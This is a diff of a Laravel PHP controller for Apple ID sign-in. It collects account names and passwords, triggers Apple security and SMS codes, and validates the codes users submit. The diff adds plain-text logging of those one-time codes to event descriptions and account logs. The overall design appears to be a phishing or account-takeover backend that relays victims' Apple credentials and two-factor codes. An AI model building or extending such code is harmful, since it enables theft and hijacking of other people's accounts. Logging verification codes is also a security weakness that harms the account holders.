@@ -37,6 +37,7 @@ use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\Event;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
+use Illuminate\Support\Str;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
 
@@ -49,6 +50,16 @@ class IndexController extends Controller
     )
     {
 
+    }
+
+    protected function getAccount(): ?Account
+    {
+        return $this->request->user();
+    }
+
+    protected function getApple():?Apple
+    {
+        return $this->request->attributes->get('apple');
     }
 
     public function ip():string
@@ -110,7 +121,7 @@ class IndexController extends Controller
         $password = $validatedData['password'];
 
         $validator = Validator::make(['email' => $accountName], [
-            'email' => 'email'
+            'email' => 'email',
         ]);
 
         // 不是有效的邮箱,那就是手机号
@@ -133,10 +144,10 @@ class IndexController extends Controller
             'account' => $accountName,
         ],[ 'password' => $password]);
 
-        Event::dispatch(new AccountLoginSuccessEvent($account));
-
         $error = $response->firstAuthServiceError()?->getMessage();
         Session::flash('Error',$error);
+
+        Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功 {$error}"));
 
         if ($response->hasTrustedDevices() || $response->getTrustedPhoneNumbers()->count() === 0){
             return $this->success(data: [
@@ -217,9 +228,9 @@ class IndexController extends Controller
 
             $response = $apple->validateSecurityCode($code);
 
-            Event::dispatch(new AccountAuthSuccessEvent($account));
+            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
         } catch (VerificationCodeIncorrect $e) {
-            Event::dispatch(new AccountAuthFailEvent($account));
+            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
             throw $e;
         }
 
@@ -230,9 +241,7 @@ class IndexController extends Controller
 
     protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
     {
-        return Account::where('account', $accountName)
-            ->whereNotNull('password')
-            ->first();
+        return Account::where('account', $accountName)->first();
     }
 
     /**
@@ -246,30 +255,22 @@ class IndexController extends Controller
         $Id = $this->request->input('ID',1);
         $apple_verifycode = $this->request->input('apple_verifycode');
 
-        if (empty($apple_verifycode)) {
+        if (empty($apple_verifycode) || Str::length($apple_verifycode) !== 6) {
             return $this->redirect();
         }
 
         $guid = $this->request->input('Guid');//147852
 
-        $apple = $this->appleFactory->create($guid);
+        $account = $this->getAccount();
 
-        $accountName = $apple->getUser()->get('account');
-        if (empty($accountName)) {
-            return $this->redirect();
-        }
-
-        if (empty($account = $this->getAccountInfo($accountName))) {
-            return $this->redirect();
-        }
         // 验证手机号码
         try {
 
-            $response = $apple->validatePhoneSecurityCode($apple_verifycode, $Id);
+            $response = $this->getApple()->validatePhoneSecurityCode($apple_verifycode, $Id);
 
-            Event::dispatch(new AccountAuthSuccessEvent($account));
+            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$apple_verifycode}"));
         } catch (VerificationCodeIncorrect $e) {
-            Event::dispatch(new AccountAuthFailEvent($account));
+            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
             throw $e;
         }
 
@@ -285,11 +286,18 @@ class IndexController extends Controller
      */
     public function SendSecurityCode(): JsonResponse
     {
-        $guid = $this->request->input('Guid');
+        $apple = $this->getApple();
 
-        $apple = $this->appleFactory->create($guid);
+        $response = $apple->idmsa->sendSecurityCode()->getData();
 
-        return $this->success($apple->idmsa->sendSecurityCode()->getData());
+        $this->getAccount()
+            ->logs()
+            ->create([
+            'action' => '获取安全码',
+            'description' => '获取安全码成功',
+        ]);
+
+        return $this->success($response);
     }
 
     /**
@@ -300,11 +308,7 @@ class IndexController extends Controller
      */
     public function GetPhone(): JsonResponse
     {
-        $guid = $this->request->input('Guid');
-
-        $apple = $this->appleFactory->create($guid);
-
-        $response = $apple->auth();
+        $response = $this->getApple()->auth();
 
         $trustedPhoneNumbers = $response->getTrustedPhoneNumber();
 
@@ -317,19 +321,17 @@ class IndexController extends Controller
     /**
      * 发送验证码
      * @return JsonResponse|Redirector
-     * @throws GuzzleException
+     * @throws GuzzleException|\Illuminate\Validation\ValidationException
      */
     public function SendSms(): JsonResponse|Redirector
     {
-        $ID = (int) $this->request->input('ID');
-        if (empty($ID)) {
-            return $this->error('ID is empty');
-        }
+        $params = Validator::make($this->request->all(), [
+            'ID' => 'required|integer'
+        ])->validated();
 
-        $guid = $this->request->input('Guid');
-        $apple = $this->appleFactory->create($guid);
+        $ID = (int) $params['ID'];
 
-        $response = $apple->idmsa->sendPhoneSecurityCode($ID);
+        $response = $this->getApple()->sendPhoneSecurityCode($ID);
 
         /**
          * @var $error ServiceError
